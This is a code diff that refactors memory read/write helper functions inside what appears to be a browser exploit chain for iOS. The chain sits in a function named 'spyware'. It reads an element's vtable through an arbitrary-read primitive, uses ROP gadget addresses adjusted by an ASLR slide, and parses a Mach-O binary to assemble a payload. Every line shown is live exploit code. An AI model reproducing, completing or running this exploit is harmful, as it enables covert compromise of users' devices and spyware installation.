@@ -50,6 +50,30 @@ function fsyms(mem, base, want)
     return syms;
 }
 
+function _u32(i)
+{
+    var b = this.read(i, 4);
+    return (b[0] | (b[1] << 8) | (b[2] << 16) | (b[3] << 24)) >>> 0;
+}
+
+function _read(i, l)
+{
+    if(i instanceof Int64) i = i.lo();
+    if(l instanceof Int64) l = l.lo();
+    return this.slice(i, i + l);
+}
+
+function _readInt64(addr)
+{
+    return new Int64(this.read(addr, 8));
+}
+
+function _writeInt64(i, val)
+{
+    if(i instanceof Int64) i = i.lo();
+    this.set(val.bytes(), i);
+}
+
 function spyware(stage1, memory, binary)
 {
     var wrapper = document.createElement('div')
@@ -57,6 +81,8 @@ function spyware(stage1, memory, binary)
 
     var el_addr = memory.readInt64(wrapper_addr + 0x18)
     var vtab = memory.readInt64(el_addr)
+
+    memory.u32 = _u32;
 
     // regloader:
     // 0x180ee6048      e00317aa       mov x0, x23
@@ -116,10 +142,10 @@ function spyware(stage1, memory, binary)
     var memPoolEnd          = memory.readInt64(Add(0x1a6b189a0, slide));
 
     // This is easier than Uint32Array and dividing offset all the time
-    binary.u32 = function(i){ if(i instanceof Int64) i = i.lo(); return this[i] | (this[i+1] << 8) | (this[i+2] << 16) | (this[i+3] << 24); };
-    binary.read = function(i, l) { if(i instanceof Int64) i = i.lo(); if(l instanceof Int64) l = l.lo(); return this.slice(i, i + l); };
-    binary.readInt64 = function(addr) { return new Int64(this.read(addr, 8)); };
-    binary.writeInt64 = function(i, val) { if(i instanceof Int64) i = i.lo(); this.set(val.bytes(), i); };
+    binary.u32 = _u32;
+    binary.read = _read;
+    binary.readInt64 = _readInt64;
+    binary.writeInt64 = _writeInt64;
     var pstart = new Int64('0xffffffffffffffff');
     var pend   = new Int64(0);
     var ncmds  = binary.u32(0x10);
@@ -188,10 +214,9 @@ function spyware(stage1, memory, binary)
     }
     payload.set(binary.slice(0x20, off), 0x20);
 
-    memory.u32 = function(i){ var b = read(i, 4); return b[0] | (b[1] << 8) | (b[2] << 16) | (b[3] << 24); };
-    payload.u32 = function(i){ if(i instanceof Int64) i = i.lo(); return this[i] | (this[i+1] << 8) | (this[i+2] << 16) | (this[i+3] << 24); };
-    payload.read = function(i, l) { if(i instanceof Int64) i = i.lo(); if(l instanceof Int64) l = l.lo(); return this.slice(i, i + l); };
-    payload.readInt64 = function(addr) { return new Int64(this.read(addr, 8)); };
+    payload.u32 = _u32;
+    payload.read = _read;
+    payload.readInt64 = _readInt64;
     var psyms = fsyms(payload, 0, ["gaia"]);
     if(psyms.gaia == null)
     {
